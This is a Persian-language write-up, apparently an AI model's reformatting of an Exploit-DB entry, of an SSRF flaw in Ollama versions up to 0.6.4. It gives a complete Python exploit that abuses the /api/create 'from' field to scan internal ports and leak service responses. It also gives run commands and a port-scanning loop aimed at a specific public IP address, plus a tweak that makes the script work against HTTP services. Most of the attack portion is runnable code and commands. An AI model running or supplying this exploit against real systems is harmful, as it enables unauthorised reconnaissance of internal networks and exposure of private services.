
باشه، این بار خود متن مقاله را به‌صورت ساده (بدون بلوک کد بیرونی) می‌نویسم تا در گیت‌هاب به‌عنوان مارک‌داون رندر شود. فقط از فرمت‌های استاندارد مارک‌داون مثل هدر، لیست، جدول و بلوک کد داخلی استفاده کرده‌ام و هیچ ایموجی یا شکلکی ندارم.

---

Exploit SSRF در Ollama ≤ 0.6.4 – اسکن پورت داخلی

تاریخ انتشار: ۲۰۲۵-۰۴-۰۳
نویسنده اکسپلویت: sud0
محصول: Ollama
نسخه‌های آسیب‌پذیر: ≤ 0.6.4
شناسه در Exploit‑DB: 52116

---

شرح آسیب‌پذیری

Ollama یک پلتفرم برای اجرای مدل‌های زبان بزرگ (LLM) به‌صورت محلی است. در نسخه‌های قدیمی‌تر (≤ 0.6.4)، اندپوینت /api/create دارای یک پارامتر به نام from است که برای کپی کردن یک مدل از یک آدرس از راه دور استفاده می‌شود.

نقص امنیتی: سرور Ollama به‌عنوان کلاینت به آدرس داده شده در from درخواست HTTP می‌فرستد. یک مهاجم می‌تواند این آدرس را به سرویس‌های داخلی (مانند 127.0.0.1:6379 برای Redis) تغییر دهد و باعث شود سرور به آن سرویس‌ها متصل شود. سپس با تحلیل پیام‌های خطای برگشتی، نه تنها وضعیت باز/بسته بودن پورت را تشخیص دهد، بلکه محتوای پاسخ سرویس داخلی را نیز استخراج کند.

این اکسپلویت با سوءاستفاده از همین رفتار، یک اسکنر پورت داخلی پیاده‌سازی کرده است.

---

نحوه عملکرد اسکریپت

1. ساخت پیلود:
      یک آدرس هدف به شکل https://<IP>:<PORT>/mynp/model:1.1 ساخته شده و در فیلد from قرار می‌گیرد.
2. ارسال درخواست به Ollama:
      درخواست POST به /api/create با بدنه‌ی JSON حاوی پیلود ارسال می‌شود.
3. تحلیل پاسخ خطا:
      سرور Ollama پاسخ را به‌صورت stream (خط به خط) برمی‌گرداند. اسکریپت هر خط را به‌عنوان JSON解析 می‌کند و به دنبال کلید "error" می‌گردد.
   · اگر خطای "connection refused" وجود داشته باشد → پورت بسته است.
   · اگر خطای "pull model manifest" دیده شود → پورت باز است و سرور هدف پاسخ داده است. اسکریپت با جستجوی مسیر manifests در متن خطا، بخشی از پاسخ خام (Raw Response) سرویس داخلی را استخراج و چاپ می‌کند.
4. نمایش نتیجه:
      خروجی شامل وضعیت پورت و در صورت امکان، پاسخ دریافتی از سرویس داخلی خواهد بود.

---

نیازمندی‌ها

· Python 3.6+
· کتابخانه‌ی requests (با دستور زیر نصب کنید):

```bash
pip install requests
```

---

دانلود و اجرا

ابتدا اسکریپت را با نام 52116.py ذخیره کنید (کد کامل در بخش پایانی آمده است).

دستور اجرا برای یک پورت مشخص

```bash
python3 52116.py --api <آدرس_API_اولاما> -i <آی‌پی_هدف> -p <پورت_مقصد>
```

مثال: اسکن پورت 6379 (Redis) روی همان سرور اولاما:

```bash
python3 52116.py --api http://164.155.88.185:11434 -i 164.155.88.185 -p 6379
```

نکته: در این مثال فرض شده که اولاما روی پورت 11434 اجرا می‌شود و آدرس API آن http://164.155.88.185:11434 است.

---

اسکن خودکار چند پورت با حلقه (لوپ)

اگر می‌خواهید چند پورت رایج را اسکن کنید، از یک حلقه در ترمینال استفاده کنید:

```bash
for port in 22 80 443 6379 3306 8080; do
    python3 52116.py --api http://164.155.88.185:11434 -i 164.155.88.185 -p $port
done
```

---

کد کامل اسکریپت (قابل کپی)

```python
#!/usr/bin/env python3
# Exploit Title: ollama 0.6.4 - SSRF
# Date: 2025-04-03
# Exploit Author: sud0
# Vendor Homepage: https://ollama.com/
# Software Link: https://github.com/ollama/ollama/releases
# Version: <=0.6.4
# Tested on: CentOS 8

import argparse
import requests
import json
from urllib.parse import urljoin

def check_port(api_base, ip, port):
    """
    تابع اصلی برای بررسی یک پورت خاص
    """
    api_endpoint = api_base.rstrip('/') + '/api/create'
    
    # مسیر مدل ساختگی (برای تحریک خطای manifest)
    model_path = "mynp/model:1.1"
    
    # ساخت آدرس هدف (توجه: پروتکل HTTPS ممکن است باعث خطا شود – به توضیحات زیر مراجعه کنید)
    target_url = f"https://{ip}:{port}/{model_path}"
    
    payload = {
        "model": "mario",
        "from": target_url,
        "system": "You are Mario from Super Mario Bros."
    }

    try:
        # ارسال درخواست به Ollama با stream=True برای دریافت پاسخ خط به خط
        response = requests.post(api_endpoint, json=payload, timeout=10, stream=True)
        response.raise_for_status()

        # پردازش هر خط از پاسخ
        for line in response.iter_lines():
            if line:
                try:
                    json_data = json.loads(line.decode('utf-8'))
                    if "error" in json_data and "pull model manifest" in json_data["error"]:
                        error_msg = json_data["error"]
                        # استخراج مسیر manifests از خطا
                        model_path_list = model_path.split(":", 2)
                        model_path_prefix = model_path_list[0]
                        model_path_suffix = model_path_list[1]
                        model_path_with_manifests = f"{model_path_prefix}/manifests/{model_path_suffix}"
                        if model_path_with_manifests in error_msg:
                            path_start = error_msg.find(model_path_with_manifests)
                            result = error_msg[path_start+len(model_path_with_manifests)+3:] if path_start != -1 else ""
                            print(f"Raw Response: {result}")
                        if "connection refused" in error_msg.lower():
                            print(f"[!] Port Closed - {ip}:{port}")
                        else:
                            print(f"[+] Port Maybe Open - {ip}:{port}")
                        return
                except json.JSONDecodeError:
                    continue

        print(f"[?] Unknown Status - {ip}:{port}")

    except requests.exceptions.RequestException as e:
        print(f"[x] Execute failed: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ollama ssrf - port scan")
    parser.add_argument("--api", required=True, help="Ollama api url")
    parser.add_argument("-i", "--ip", required=True, help="target ip")
    parser.add_argument("-p", "--port", required=True, type=int, help="target port")
    args = parser.parse_args()
    
    check_port(args.api, args.ip, args.port)
```

---

نکته مهم درباره پروتکل

در خط ۱۸ کد، آدرس هدف با https:// ساخته شده است. بسیاری از سرویس‌های داخلی (مانند Redis، MySQL، HTTP سرورها) از HTTP استفاده می‌کنند و گواهی SSL ندارند. در نتیجه درخواست با خطای SSL مواجه شده و پورت به اشتباه «بسته» گزارش می‌شود.

راه حل: اگر سرویس هدف HTTP است، خط مذکور را به صورت زیر تغییر دهید:

```python
target_url = f"http://{ip}:{port}/{model_path}"
```

همچنین می‌توانید یک آرگومان --proto به اسکریپت اضافه کنید تا کاربر بتواند پروتکل را انتخاب کند.

---

تفسیر خروجی‌ها

خروجی معنی
[!] Port Closed - ... پورت بسته است یا فایروال درخواست را مسدود کرده است.
[+] Port Maybe Open - ... پورت باز است و سرور هدف پاسخ داده است (حتی اگر خطای pull model manifest داده باشد، یعنی سرویسی در آن پورت فعال است).
Raw Response: ... محتوای پاسخ سرویس داخلی (مثلاً HTTP/1.1 404 Not Found یا +OK برای Redis). این نشان می‌دهد که نه تنها پورت باز است، بلکه اطلاعات بیشتری از سرویس لو رفته است.
[?] Unknown Status وضعیت نامشخص (مثلاً تایم‌اوت یا پاسخ غیرJSON).
[x] Execute failed خود Ollama پاسخ نمی‌دهد (آدرس API اشتباه است یا سرویس در دسترس نیست).

---

مثال عملی (با فرض تغییر پروتکل به HTTP)

فرض کنید سرور اولاما روی http://164.155.88.185:11434 اجرا می‌شود و می‌خواهیم پورت 80 (وب‌سرور) را روی همان آی‌پی اسکن کنیم:

```bash
python3 52116.py --api http://164.155.88.185:11434 -i 164.155.88.185 -p 80
```

اگر یک وب‌سرور روی پورت ۸۰ پاسخ دهد، خروجی مشابه زیر خواهد بود:

```
[+] Port Maybe Open - 164.155.88.185:80
Raw Response: <html><body><h1>It works!</h1></body></html>
```

این یعنی شما نه تنها پورت را پیدا کردید، بلکه صفحه‌ی اصلی وب‌سرور را نیز مشاهده می‌کنید.

---

ملاحظات امنیتی

· این اسکریپت فقط در محیط‌های آزمایشی و با مجوز صریح استفاده شود.
· استفاده از آن بر روی سامانه‌های بدون مجوز، غیراخلاقی و غیرقانونی است.
· در صورتی که Ollama روی localhost یا 127.0.0.1 اجرا شود، مهاجم می‌تواند به تمام سرویس‌های داخلی همان سرور دسترسی پیدا کند.

---

منابع

· Exploit-DB: 52116
· مستندات Ollama

---

توجه: این مطلب صرفاً برای آگاهی‌بخشی و تست نفوذ در محیط‌های مجاز تهیه شده است. استفاده‌ی نادرست از آن بر عهده‌ی کاربر خواهد بود.
